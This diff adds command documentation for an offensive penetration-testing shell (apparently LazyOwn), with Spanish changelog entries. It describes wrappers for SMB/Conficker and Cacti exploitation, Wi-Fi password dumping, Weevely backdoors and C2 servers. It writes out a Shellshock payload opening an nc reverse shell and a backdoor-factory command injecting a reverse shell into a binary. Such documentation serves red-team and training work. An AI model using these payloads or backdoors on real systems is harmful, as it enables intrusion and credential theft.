+- The function first checks if a URL is set in the parameters.
+- It then validates that the correct number of arguments is provided.
+- If the arguments are valid, it constructs the PadBuster command and executes it.
+- The command is also copied to the clipboard for convenience.
+
+Usage Example:
+- set url http://target.com
+- padbuster auth=<HASH> user=admin 8
+
+## smbattack
+Scans for hosts with SMB service open on port 445 in the specified target network.
+
+This function performs the following actions:
+1. Scans the specified subnet for hosts with an open SMB port (445).
+2. Sets up a Metasploit handler to listen for reverse connections.
+3. Attempts to exploit the Conficker vulnerability on each identified host.
+4. Optionally conducts a brute-force attack on SMB using the provided password file.
+
+Parameters:
+line (str): The command line input for the smbattack function, 
+            though not used directly in this implementation.
+
+Returns:
+None
+
+## cacti_exploit
+Automates the exploitation of the Cacti version 1.2.26 vulnerability 
+using the multi/http/cacti_package_import_rce exploit.
+
+This function performs the following actions:
+1. Sets up a Metasploit handler to listen for reverse connections.
+2. Attempts to log in to the Cacti instance with provided credentials.
+3. Checks if the target is vulnerable and uploads the malicious payload.
+4. Triggers the payload to obtain a Meterpreter session.
+
+Parameters:
+line (str): The command line input for the cacti exploit function, 
+            though used directly in this implementation to set password.
+
+Returns:
+None
+
+## smalldic
+Handles the creation of temporary files for users and passwords based on a small dictionary.
+
+This function prompts the user to decide whether to use a small dictionary for generating 
+user and password lists. If the user agrees, it loads the credentials from a JSON file and 
+writes them into temporary files. If the user declines, the process is aborted.
+
+Parameters:
+list (str): Not used in this function, but kept for compatibility with cmd command input.
+
+Returns:
+None
+
+## ngrok
+Set up and run ngrok on a specified local port. If ngrok is not installed, it will
+automatically be installed. The user will be prompted to provide their ngrok
+authentication token to complete the setup.
+
+Args:
+    line (str): The input line, though it's not directly used in this function.
+
+Workflow:
+1. Check if the local port specified in `self.params["lport"]` is valid.
+2. Verify if ngrok is installed. If not, proceed with installation.
+3. After installation, prompt the user to authenticate ngrok using their token.
+4. Once authenticated, run ngrok to expose the specified local port.
+
+Note:
+    The ngrok authentication token can be obtained from the ngrok dashboard.
+
+## wifipass
+This function generates a PowerShell script that retrieves saved Wi-Fi passwords on a Windows system.
+The script gathers the Wi-Fi profiles, extracts their passwords, and saves the information in a text file
+named 'wifi_passwords.txt' in the directory where the script is executed. The generated PowerShell command
+is copied to the clipboard for easy execution.
+
+Parameters:
+line (str): This parameter is not used within the function but is required for the command interface.
+
+The function does not return any value.
+
+## shellshock
+Executes a Shellshock attack against a target.
+
+This function constructs and sends a specially crafted HTTP request designed to exploit 
+the Shellshock vulnerability on a target server. The payload is embedded in the 
+'User-Agent' header, and when executed, it will open a reverse shell connection to 
+the attacker's machine.
+
+Parameters:
+- lport: Local port for the reverse shell connection, retrieved from self.params.
+- lhost: Local host for the reverse shell connection, retrieved from self.params.
+
+The function first validates the local host (lhost) and local port (lport) using 
+check_lhost() and check_lport(). If either validation fails, the function returns 
+without proceeding.
+
+If the validation passes, the payload is created using the format:
+'() { :; }; /bin/bash -c "nc -v {rhost} {lport} -e /bin/bash -i"',
+where rhost is the remote target's IP address and lport is the specified local port.
+
+The function then attempts to send a GET request to the target URL (args.target) 
+with the crafted payload in the 'User-Agent' header. The server's response is captured 
+and printed using print_msg().
+
+If any error occurs during the request, an error message is displayed using print_error().
+
+Returns:
+None
+
+## powerserver
+This function generates a PowerShell script that retrieves reverse shell over http on a Windows system.
+The script generated PowerShell reverse shell to execute command by curl command
+is copied to the clipboard for easy execution.
+
+Parameters:
+line (str): This parameter is used to get the port to create the listener
+
+The function does not return any value.
+Example of use: curl -X POST http://victim:8080/ -d "Get-Process"
+
+## morse
+Interactive Morse Code Converter.
+
+This function serves as an interface for converting text to Morse code and vice versa. 
+It provides a menu with the following options:
+
+1️⃣  Convert text to Morse code.
+2️⃣  Convert Morse code to text.
+0️⃣  Exit the program.
+
+When the function is called, it runs an external script (`morse.py`) that handles 
+the conversion processes. The function also manages keyboard interruptions 
+gracefully, allowing the user to exit the program cleanly.
+
+Arguments:
+line (str): This argument is reserved for future enhancements but is currently not used.
+
+Returns:
+None
+
+Notes:
+- Ensure that the `morse.py` module is located in the `modules` directory and is executable.
+- The function captures `KeyboardInterrupt` to allow safe exit from the Morse code converter.
+
+Example:
+>>> do_morse("")
+
+See Also:
+- `morse.py`: The script that contains the logic for Morse code conversions.
+
+## waybackmachine
+Fetch URLs from the Wayback Machine for a given website.
+The URL is taken from line. If the URL is not provided, an error is printed.
+The limit of results is taken from self.params["limit"] if provided; otherwise, defaults to 10.
+Results are printed directly to the console.
+
+## c2
+Handles the execution of a C2 (Command and Control) server setup command.
+
+This function performs the following tasks:
+1. Retrieves and validates the local host (lhost) and local port (lport) parameters.
+2. Checks if the required file `modules/run` exists.
+3. Reads the content of the `modules/run` file, replaces placeholders with actual values (lport, line, lhost), 
+and copies the updated content to the clipboard.
+4. Prompts the user to start the C2 server, and if confirmed, executes the server command.
+5. Provides a warning about shutting down the server.
+
+Args:
+    line (str): The victim ID or command line to be used by the C2 server.
+
+Returns:
+    None
+
+Raises:
+    None
+
+Example:
+    c2 victim-1
+
+Notes:
+    - Ensure that the `lhost` and `lport` parameters are valid before calling this function.
+    - The `modules/run` file must exist and be correctly formatted.
+    - The server command is executed using `os.system`, which may require additional handling for security.
+
+## kick
+Handles the process of sending a spoofed ARP packet to a specified IP address with a given MAC address.
+
+This function performs the following steps:
+1. Executes a command to list current ARP entries and prints the IP and MAC addresses.
+2. Prompts the user to input the target IP and MAC address in a specified format.
+3. Parses the provided input to extract the IP and MAC addresses.
+4. Sets up default values for the gateway IP, local MAC address, and network interface.
+5. Creates an ARP packet with the specified target IP and MAC address.
+6. Sends the ARP packet using the specified network interface.
+7. Prints a confirmation message indicating that the spoofing packet has been sent.
+
+Args:
+    line (str): Input line for the command, which is not used directly in this function.
+
+Raises:
+    Exception: If any error occurs during the execution of the function.
+
+## sqli
+Asks the user for the URL, database, table, and columns, and then executes the Python script 
+'modules/lazybsqli.py' with the provided parameters.
+
+Parameters:
+- def_func: Function to execute (not used in this example).
+- line: Command line or additional input (not used in this example).
+
+Example:
+- do_bsqli(None, None)
+
+## sshkey
+Generates an SSH key pair with RSA 4096-bit encryption. If no name is provided, it uses 'lazyown' by default.
+The keys are stored in the 'sessions/' directory.
+
+Parameters:
+- line: The name of the key file. If empty, 'lazyown' is used as the default.
+
+Example:
+- do_sshkey(None)  # Generates 'lazyown' key
+- do_sshkey("custom_key")  # Generates 'custom_key' key
+
+## crunch
+Generate a custom dictionary using the `crunch` tool.
+
+This function creates a wordlist with a specified length using the `crunch` command. 
+It allows the user to specify a custom character pattern for the wordlist.
+
+:param line: The length of the strings to be generated (e.g., '6' for 6-character strings).
+            If not provided, the function will prompt an error message.
+
+:returns: None
+
+Example usage:
+>>> crunch 6
+This will generate a wordlist with all possible combinations of 6-character strings using the default pattern.
+
+Additional notes:
+- If no custom pattern is provided, the function uses a default pattern: "0123456789abcdefghijklmnñopqrstuvxyz,.-#$%@"
+- The output is saved in the `sessions/` directory with the filename format `dict_<length>.txt`
+
+## malwarebazar
+Fetches and displays malware information from the MalwareBazaar API based on the given tag.
+
+Args:
+    line (str): The tag used to query the MalwareBazaar API.
+
+This function performs the following steps:
+1. Constructs a URL to query the MalwareBazaar API with the provided tag.
+2. Uses `curl` to send a POST request to the API and saves the response in a JSON file.
+3. Checks if the file was successfully created and exists.
+4. Loads the JSON data from the file.
+5. Checks the `query_status` field to determine if there are results.
+    - If `no_results`, prints a warning message and exits the function.
+6. Iterates through the list of file information provided in the response.
+    - Prints detailed information about each file, including:
+        - File name
+        - File type
+        - File size
+        - Hashes (SHA-256, SHA-1, MD5)
+        - First seen date
+        - Signature
+        - Tags
+        - ClamAV results (if any)
+        - Downloads and uploads count
+7. Deletes the temporary file used to store the API response.
+
+Returns:
+    None
+
+## download_malwarebazar
+Download a malware sample from MalwareBazaar using its SHA256 hash.
+
+This function allows the user to download a malware sample from MalwareBazaar by providing 
+the SHA256 hash of the desired file. If the hash is not provided as an argument, the function 
+will prompt an error message indicating the correct usage. The downloaded malware sample 
+will be saved as a zipped file (`malware.zip`) and will be password protected.
+
+Arguments:
+line (str): The SHA256 hash of the malware sample to be downloaded.
+
+Returns:
+None
+
+Example:
+>>> download_malwarebazar 094fd325049b8a9cf6d3e5ef2a6d4cc6a567d7d49c35f8bb8dd9e3c6acf3d78d
+
+Notes:
+- Ensure that the SHA256 hash provided is correct and that it corresponds to a file available 
+on MalwareBazaar.
+- The downloaded file will be password protected using the password "infected".
+- To obtain the SHA256 hash of malware samples, refer to the `help malwarebazar` command.
+
+See Also:
+- `run(command)`: Utility function used to execute the command for downloading the malware.
+
+## sslscan
+Run an SSL scan on the specified remote host.
+
+This function initiates an SSL scan on a specified remote host (`rhost`)
+using the `sslscan-singleip.sh` script. If a specific port is provided in the
+`line` argument, the scan will target that port; otherwise, it will scan
+all available ports.
+
+Parameters:
+line (str): The port number to scan (optional). If omitted, the scan will target all ports.
+
+Internal Variables:
+rhost (str): The remote host IP address or hostname extracted from the `params` attribute.
+
+Returns:
+None
+
+Example Usage:
+- To scan all ports on the specified `rhost`: `sslscan`
+- To scan a specific port (e.g., port 443) on `rhost`: `sslscan 443`
+
+Note:
+- The `check_rhost()` function is used to validate the `rhost` before running the scan.
+- The `sslscan-singleip.sh` script must be present in the `sessions` directory.
+
+## cewl
+This function constructs and executes a command for the 'cewl' tool.
+It first checks if the 'url' parameter is set. If not, it prints an error message.
+If the 'url' is set, it extracts the domain from the URL using the get_domain function.
+Then, it constructs a 'cewl' command with the specified parameters and prepares it for execution.
+
+Scan to a depth of 2 (-d 2) and use a minimum word length of 5 (-m 5), save the words to a file (-w docswords.txt), targeting the given URL (https://example.com):
+
+Parameters:
+line (str): The command line input for this function.
+
+Expected self.params keys:
+- url (str): The URL to be used for the 'cewl' command.
+
+Example usage:
+- set url http://example.com
+- do_cewl
+
+## dmitry
+This function constructs and executes a command for the 'dmitry' tool.
+It first checks if the 'url' parameter is set. If not, it prints an error message.
+If the 'url' is set, it extracts the domain from the URL using the get_domain function.
+Then, it constructs a 'dmitry' command with the specified parameters and prepares it for execution.
+
+Run a domain whois lookup (w), an IP whois lookup (i), retrieve Netcraft info (n), search for subdomains (s), search for email addresses (e), do a TCP port scan (p), and save the output to example.txt (o) for the domain example.com:
+
+Parameters:
+line (str): The command line input for this function.
+
+Expected self.params keys:
+- url (str): The URL to be used for the 'dmitry' command.
+
+Example usage:
+- set url http://example.com
+- do_dmitry
+
+## graudit
+Executes the graudit command to perform a static code analysis with the specified options.
+
+This function runs the 'graudit' tool with the '-A' option for an advanced scan and 
+the '-i sessions' option to include session files. The results will be displayed 
+directly in the terminal.
+
+Args:
+    line (str): Input line from the command interface. This argument is currently 
+                not used within the function but is required for the command 
+                interface structure.
+                
+Example:
+    To run this function from the command interface, simply type 'graudit' and press enter.
+    The function will execute the 'graudit -A -i sessions' command.
+
+Note:
+    Ensure that 'graudit' is installed and properly configured in your system's PATH 
+    for this function to work correctly.
+
+## msfrpc
+Connects to the msfrpcd daemon and allows remote control of Metasploit.
+
+Usage:
+    msfrpc -a <IP address> -p <port> -U <username> -P <password> [-S]
+
+This command will prompt the user for necessary information to connect to msfrpcd.
+
+## nuclei
+Executes a Nuclei scan on a specified target URL or host.
+
+Usage:
+    nuclei -u <URL> [-o <output file>] [other options]
+
+If a URL is provided as an argument, it will be used as the target for the scan.
+Otherwise, it will use the target specified in self.params["rhost"].
+
+## parsero
+Executes a parsero scan on a specified target URL or host.
+
+Usage:
+    parsero -u <URL> [-o <output file>] [other options]
+
+If a URL is provided as an argument, it will be used as the target for the scan.
+Otherwise, it will use the target specified in self.params["rhost"].
+
+## sherlock
+Executes the Sherlock tool to find usernames across social networks.
+
+This function takes a username as an argument and runs the Sherlock tool 
+to check for the username's presence on various social networks. The 
+results are saved in CSV format in the `sessions` directory.
+
+Parameters:
+line (str): The username to be checked by Sherlock. If not provided, an 
+            error message is printed and the function returns.
+
+Returns:
+None
+
+Raises:
+None
+
+Example:
+>>> do_sherlock("example_user")
+Running command: sherlock example_user --local -v --csv --print-found
+
+Additional Notes:
+- The Sherlock tool must be installed and available in the system path.
+- The results are saved in the `sessions` directory as a CSV file.
+- The `--local` flag forces the use of a local `data.json` file, 
+which should be present in the appropriate directory.
+
+## trufflehog
+Executes trufflehog to search for secrets in a given Git repository URL. 
+If trufflehog is not installed, it installs the tool automatically. 
+This function navigates to the 'sessions' directory and runs trufflehog 
+with the provided Git URL, outputting the results in JSON format.
+
+Args:
+    line (str): The Git repository URL to scan for secrets.
+
+Returns:
+    None
+
+Raises:
+    None
+
+Example:
+    trufflehog https://github.com/user/repo.git
+
+Notes:
+    - Ensure that trufflehog is installed or it will be installed automatically.
+    - The output of the trufflehog scan is printed and executed in the 'sessions' directory.
+
+## weevelygen
+Generate a PHP backdoor using Weevely, protected with the given password.
+
+This function generates a PHP backdoor file using the specified password. It ensures that Weevely is installed on the system before attempting to generate the backdoor. If Weevely is not present, it will be installed automatically. 
+
+Usage:
+┌─[LazyOwn👽127.0.0.1 ~/LazyOwn][10.10.10.10][http://victim.local/]
+└╼ $ weevelygen s3cr3t
+
+Parameters:
+line (str): The password to protect the generated PHP backdoor.
+
+Returns:
+None
+
+Raises:
+print_error: If the password argument is not provided.
+print_warn: If Weevely is not installed and needs to be installed.
+
+Example:
+To generate a PHP backdoor protected with the password 's3cr3t', use the following command:
+$ weevelygen s3cr3t
+
+## weevely
+Connect to PHP backdoor using Weevely, protected with the given password.
+
+This function Connect to PHP backdoor file using the specified password. It ensures that Weevely is installed on the system before attempting to generate the backdoor. If Weevely is not present, it will be installed automatically. 
+
+Usage:
+┌─[LazyOwn👽127.0.0.1 ~/LazyOwn][10.10.10.10][http://victim.local/]
+└╼ $ weevely http://victim.local/weevely.php s3cr3t
+
+Parameters:
+line (str): the url to Weevely shell and the password to protect the generated PHP backdoor.
+
+Returns:
+None
+
+Raises:
+print_error: If the password argument is not provided.
+print_warn: If Weevely is not installed and needs to be installed.
+
+Example:
+To generate a PHP backdoor protected with the password 's3cr3t', use the following command:
+$ weevelygen s3cr3t
+
+## changeme
+Executes a changeme scan on a specified target URL or host.
+
+Usage:
+    changeme [-o <output file>] --oa -t 20 rhost
+
+If a URL is provided as an argument, it will be used as the target for the scan.
+Otherwise, it will use the target specified in self.params["rhost"].
+
+## enum4linux_ng
+Performs enumeration of information from a target system using `enum4linux-ng`.
+
+1. Executes the `enum4linux-ng` command with the `-A` option to gather extensive information from the specified target.
+
+:param line: This parameter is not used in the current implementation but could be used to pass additional options or arguments if needed.
+:param rhost: The target host for enumeration, specified in the `params` dictionary.
+
+:returns: None
+
+Manual execution:
+To manually enumerate information from a system, use the following command:
+    enum4linu-ng -A <target_host>
+
+Replace `<target_host>` with the IP address or hostname of the target system.
+
+For example:
+    enum4linux-ng -A 192.168.1.10
+
+## fuzz
+Executes a web server fuzzing script with user-provided parameters.
+
+This function prompts the user for the necessary parameters to run the fuzzing script,
+including the target IP, port, HTTP method, directory, file extension, and expected status codes.
+
+Usage:
+    fuzzing
+
+Parameters:
+    line (str): The command line input for the function (not used directly in the current implementation).
+
+Returns:
+    None
+
+Example:
+    To run the fuzzing script, enter the required parameters when prompted by the function.
+
+## sharpshooter
+Executes a payload creation framework for the retrieval and execution of arbitrary CSharp source code.
+SharpShooter is capable of creating payloads in a variety of formats, including HTA, JS, VBS, and WSF.
+
+Usage:
+    sharpshooter [-o <output file>] --oa -t 20 rhost
+
+This function installs SharpShooter if it is not already installed, prompts the user for the payload type, 
+and then runs SharpShooter to create a payload based on the specified type.
+
+Parameters:
+    line (str): The command line input for the function (not used directly in the current implementation).
+
+Returns:
+    None
+
+Example:
+    To create a payload using SharpShooter, ensure you have already generated shellcode using lazymsfvenom or venom,
+    and then run this function to specify the payload type and generate the final payload file.
+
+## sliver_server
+Starts the Sliver server and generates a client configuration file for connecting clients.
+Provides options to download the Sliver client for Windows, Linux, or macOS.
+
+Usage:
+    sliver-server [flags]
+    sliver-client [command]
+
+This function installs Sliver if it is not already installed, starts the Sliver server,
+generates the necessary certificates, and creates a client configuration file. 
+It also provides options to download the client for different operating systems.
+
+Parameters:
+    line (str): The command line input for the function (not used directly in the current implementation).
+
+Returns:
+    None
+
+Example:
+    To start the Sliver server, generate the necessary certificates, and download the client,
+    run this function. Choose the appropriate client download option based on the operating system.
+
+## gencert
+Generates a certificate authority (CA), client certificate, and client key.
+
+Returns:
+    str: Paths to the generated CA certificate, client certificate, and client key.
+
+## kerbrute
+Executes the Kerbrute tool to enumerate user accounts against a specified target domain controller.
+
+This function performs the following actions:
+1. Retrieves necessary parameters such as the target URL and remote host (rhost).
+2. Determines the domain based on the provided URL.
+3. Validates the remote host address.
+4. Constructs and executes the Kerbrute command to enumerate user accounts, saving the results in the sessions/users.txt file.
+
+Parameters:
+line (str): Specify 'pass' to use credentials from 'credentials.txt' for password spraying, 'brute' to brute force using 'users.txt' and the RockYou wordlist, or leave empty for default behavior.
+
+Returns:
+None
+
+Example:
+To enumerate user accounts using Kerbrute, ensure Kerbrute is in your path, 
+then run this function to perform the enumeration.
+
+Note:
+- The function assumes that the Kerbrute binary (kerbrute_linux_amd64) is present in the system's PATH.
+- The file sessions/users.txt should exist and contain the list of usernames to enumerate.
+
+## dacledit
+Execute the dacledit.py command for a specific user or all users listed in the users.txt file.
+
+This function interacts with the DACL editor to modify access control lists in an Active Directory environment. 
+It allows the user to select a specific user from the list or execute the command for all users.
+Install impacket suit to get this script in the examples
+Args:
+    line (str): The organizational unit (OU) in the format 'OU=EXAMPLE,DC=DOMAIN,DC=EXT'. If not provided, the user is prompted to enter it.
+
+Returns:
+    None
+
+Workflow:
+    1. Extract parameters and set up paths.
+    2. Check the reachability of the remote host.
+    3. Prompt the user for an OU if not provided.
+    4. Check if the users.txt file exists and read the list of users.
+    5. Display the list of users and prompt the user to select a specific user.
+    6. Execute the dacledit.py command for the selected user or all users.
+
+Raises:
+    FileNotFoundError: If the users.txt file does not exist.
+
+Example:
+    To execute the command for a specific user:
+    >>> do_dacledit("MARKETING DIGITAL")
+
+    To execute the command for all users:
+    >>> do_dacledit("")
+
+## bloodyAD
+Execute the bloodyAD.py command for a specific user or all users listed in the users.txt file.
+
+This function interacts with BloodyAD to add users to a group in an Active Directory environment.
+It allows the user to select a specific user from the list or execute the command for all users.
+(use download_external option 48 to clone the repo)
+Args:
+    line (str): The organizational unit (OU) in the format 'CN=EXAMPLE,DC=DOMAIN,DC=EXT'. 
+                If not provided, the user is prompted to enter it.
+
+Returns:
+    None
+
+Workflow:
+    1. Extract parameters and set up paths.
+    2. Check the reachability of the remote host.
+    3. Prompt the user for a CN if not provided.
+    4. Check if the users.txt file exists and read the list of users.
+    5. Display the list of users and prompt the user to select a specific user.
+    6. Execute the bloodyAD.py command for the selected user or all users.
+
+Raises:
+    FileNotFoundError: If the users.txt file does not exist.
+
+Example:
+    To execute the command for a specific user:
+    >>> do_bloodyAD("")
+
+    To execute the command for all users:
+    >>> do_bloodyAD("")
+
+## evilwinrm
+Executes the Evil-WinRM tool to attempt authentication against the specified target.
+
+This function performs the following actions:
+1. Checks if the provided target host (`rhost`) is valid.
+2. If the `line` argument is "pass", it reads credentials from the `credentials.txt` file and attempts authentication for each user-password pair using Evil-WinRM.
+3. If `line` is not "pass", it prints an error message indicating the correct usage.
+
+Parameters:
+line (str): A command argument to determine the action. 
+            If "pass", the function reads credentials from the `credentials.txt` file and attempts to authenticate.
+            If not "pass", it prints an error message with usage instructions.
+
+Returns:
+None
+
+## getTGT
+Requests a Ticket Granting Ticket (TGT) using the Impacket tool with provided credentials.
+
+This function performs the following actions:
+1. Checks if the provided target host (`rhost`) is valid.
+2. Reads credentials from the `credentials.txt` file.
+3. Uses each credential (username and password) to request a TGT with the Impacket tool.
+4. Constructs and executes the Impacket command to obtain a TGT for each set of credentials.
+
+Parameters:
+line (str): A command line argument, not used in this implementation.
+
+Returns:
+None
+
+## apache_users
+Performs enumeration of users from a target system using `apache-users`.
+
+1. Executes the `apache-users` command with the `-h` option to specified target.
+
+:param line: This parameter is not used in the current implementation but could be used to pass additional options or arguments if needed.
+:param rhost: The target host for enumeration, specified in the `params` dictionary.
+
+:returns: None
+
+Manual execution:
+To manually enumerate information from a system, use the following command:
+    apache-users -h <target_host> -l <wordlist> -p <apache_port> -s 0 -e 403 -t 10
+
+Replace `<target_host>` with the IP address or hostname of the target system.
+
+For example:
+    apache-users -h 192.168.1.202 -l /usr/share/wordlists/metasploit/unix_users.txt -p 80 -s 0 -e 403 -t 10
+
+## backdoor_factory
+Creates a backdoored executable using `backdoor-factory`.
+
+This function checks if `backdoor-factory` is installed, installs it if necessary, and then uses it to 
+inject a reverse shell payload into a specified binary file. The binary is backdoored with a 
+reverse shell payload that connects back to a specified host and port.
+
+:param line: The absolute path to the file that will be backdoored. If not provided, the user is prompted 
+            to enter the path.
+
+:returns: None
+
+Manual execution:
+To manually create a backdoored executable, use the following command:
+    backdoor-factory -f <file_path> -H <lhost> -P <lport> -s reverse_shell_tcp_inline -J -a -c -l 128 -o <output_file>
+
+Replace `<file_path>` with the path to the binary you want to backdoor, `<lhost>` with the IP address of 
+the attacker’s machine, and `<lport>` with the port number to listen on. The `<output_file>` is the path 
+where the backdoored binary will be saved.
+
+For example:
+    backdoor-factory -f /usr/share/windows-binaries/plink.exe -H 192.168.1.202 -P 4444 -s reverse_shell_tcp_inline -J -a -c -l 128 -o sessions/backdoor_factory.exe
+
+## davtest
+Tests WebDAV server configurations using `davtest`.
+
+This function checks if `davtest` is installed and installs it if necessary. It then runs `davtest` 
+to perform a WebDAV server test against a specified URL or the default URL configured in `self.params`.
+
+:param line: The URL of the WebDAV server to test. If provided, it overrides the default URL. 
+            If not provided, the function uses the URL specified in `self.params["rhost"]`.
+
+:returns: None
+
+Manual execution:
+To manually test a WebDAV server, use the following command:
+    davtest --url <url>
+
+Replace `<url>` with the URL of the WebDAV server you want to test.
+
+For example:
+    davtest --url http://example.com/webdav
+
+## msfpc
+Generates payloads using MSFvenom Payload Creator (MSFPC).
+
+This function checks if `msfpc` is installed and installs it if necessary. It then runs `msfpc`
+with the specified parameters to create a payload for penetration testing.
+
+:param line: Not used in this implementation but reserved for future use.
+
+:returns: None
+
+Manual execution:
+To manually generate a payload using MSFPC, use the following command:
+    msfpc <TYPE> <DOMAIN/IP> <PORT> <CMD/MSF> <BIND/REVERSE> <STAGED/STAGELESS> <TCP/HTTP/HTTPS/FIND_PORT> <BATCH/LOOP> <VERBOSE>
+
+Replace the placeholders with the desired values. For example:
+    msfpc windows 192.168.1.10 4444 reverse stageless tcp verbose
+
+Example usage:
+    msfpc windows 192.168.1.10        # Windows & manual IP.
+    msfpc elf bind eth0 4444          # Linux, eth0's IP & manual port.
+    msfpc stageless cmd py https      # Python, stageless command prompt.
+    msfpc verbose loop eth1           # A payload for every type, using eth1's IP.
+    msfpc msf batch wan               # All possible Meterpreter payloads, using WAN IP.
+
+## find_tgts
+Finds and returns a list of target hosts with port 445 open in the specified subnet.
+
+Args:
+    subnet (str): The subnet to scan, e.g., '192.168.1.0/24'.
+
+Returns:
+    list: A list of IP addresses where port 445 is open.
+
+## setup_handler
+Sets up a Metasploit multi/handler configuration in the given config file.
+
+Args:
+    config_file (file-like object): The file object to write the Metasploit handler configuration to.
+    lhost (str): The local host IP address to listen for incoming connections.
+    lport (int): The local port number to listen for incoming connections.
+
+Writes:
+    - Exploit configuration for Metasploit to the provided file.
+
+## conficker_exploit
+Configures and writes a Metasploit exploit for the Conficker vulnerability to the given config file.
+
+Args:
+    config_file (file-like object): The file object to write the Metasploit exploit configuration to.
+    host (str): The target host IP address to exploit.
+    lhost (str): The local host IP address to listen for incoming connections.
+    lport (int): The local port number to listen for incoming connections.
+
+Writes:
+    - Exploit configuration for the Conficker vulnerability (MS08-067) to the provided file.
+
+## smb_brute
+Configures and writes a Metasploit SMB brute force exploit for the given host to the provided config file.
+
+Args:
+    config_file (file-like object): The file object to write the Metasploit exploit configuration to.
+    host (str): The target host IP address to exploit.
+    passwd_file (str): Path to a file containing a list of passwords to use for brute force.
+    lhost (str): The local host IP address to listen for incoming connections.
+    lport (int): The local port number to listen for incoming connections.
+
+Writes:
+    - Exploit configuration for SMB brute force (using the psexec module) to the provided file for each password in the passwd_file.
+
+## setup_handler
+Sets up a Metasploit multi/handler exploit configuration in the provided config file.
+
+Args:
+    config_file (file-like object): The file object to write the Metasploit handler configuration to.
+    lhost (str): The local host IP address to listen for incoming connections.
+    lport (int): The local port number to listen for incoming connections.
+
+Writes:
+    - Configuration commands to the file to set up the Metasploit handler with the specified payload and options.
+    - The payload used is `php/meterpreter/reverse_tcp`.
+    - The handler is configured to listen on the provided LHOST and LPORT.
+    - Starts the exploit with the `-j -z` options.
+
+## cacti_exploit
+Configures an exploit for the Cacti Package Import Remote Code Execution vulnerability in the provided config file.
+
+Args:
+    config_file (file-like object): The file object to write the Metasploit exploit configuration to.
+    host (str): The target host IP address where the Cacti service is running.
+
+Writes:
+    - Configuration commands to the file to set up the Metasploit exploit for the Cacti Package Import RCE.
+    - Sets the RHOST to the target host IP.
+    - Sets the payload options including the LHOST, USERNAME, and PASSWORD.
+    - Starts the exploit with the `-j -z` options.
 
 ## double_base64_encode
 Perform double Base64 encoding on the given command.
@@ -5557,6 +6422,188 @@ Raises:
 <!-- START CHANGELOG -->
 
 # Changelog
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(fet): msfpc \n\n Version: release/0.1.38 \n\n automation \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Sep 3 01:15:14 2024 -0400 \n\n Hora: 1725340514
+
+
+### Otros
+
+### Otros
+
+  *   * feature(feat): comandos nuevos documentados en commands.md \n\n Version: release/0.1.37 \n\n davtest y backdoor_factory \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Sep 2 23:34:25 2024 -0400 \n\n Hora: 1725334465
+
+
+### Otros
+
+### Otros
+
+  *   * feature(feat): new command apache_users & new options -p to use diferents payloads.json \n\n Version: release/0.1.36 \n\n now more oriented to redteams you can run multiple instances with multiple payloads \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - main.py - sessions/users.txt - sessions/win/winp.ps1 - templates/index.html - utils.py\nDeleted file(s):\n- main.py - templates/index.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Sep 1 05:45:31 2024 -0400 \n\n Hora: 1725183931
+
+
+### Documentación
+
+### Otros
+
+  *   * docs(docs): documented malwarebazar \n\n Version: release/0.1.35 \n\n Fetches and displays malware information from the MalwareBazaar API based on the given tag. \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - sessions/download_resources.sh\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Sep 1 00:21:33 2024 -0400 \n\n Hora: 1725164493
+
+
+### Documentación
+
+### Otros
+
+  *   * docs(docs): documentating \n\n Version: release/0.1.35 \n\n functions dacledit and bloodyAD \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Sep 1 00:13:39 2024 -0400 \n\n Hora: 1725164019
+
+
+### Otros
+
+### Otros
+
+  *   * feature(feat): Nuevos comandos documentados en COMMANDS.md \n\n Version: release/0.1.35 \n\n kerbrute, dacledit, bloodyAD, evilwinrm, getTGT \n\n Modified file(s):\n- .gitignore - COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - external/install_external.sh - lazyown - payload.json - sessions/php/LFI/scan-LFI.php - sessions/php/LFI/uploadshellLFI.php - sessions/php/ar-protable/arabportable.php - sessions/php/jo/bru-jo.php - sessions/php/jo/pass.txt - sessions/php/jo/site.txt - sessions/php/shell/c2.sh - sessions/php/shell/shell.php - sessions/php/user/user.php - sessions/php/wp/wp.php - sessions/users.txt\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Aug 31 06:21:44 2024 -0400 \n\n Hora: 1725099704
+
+
+### Otros
+
+### Otros
+
+  *   * feature(feat): nuevos comandos documetados en COMMANDS.md \n\n Version: release/0.1.34 \n\n changeme, enum4linux_ng, fuzz, sharpshooter, sliver_server, gencert \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - lazyown - sessions/download_resources.sh - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Aug 30 23:33:30 2024 -0400 \n\n Hora: 1725075210
+
+
+### Otros
+
+### Otros
+
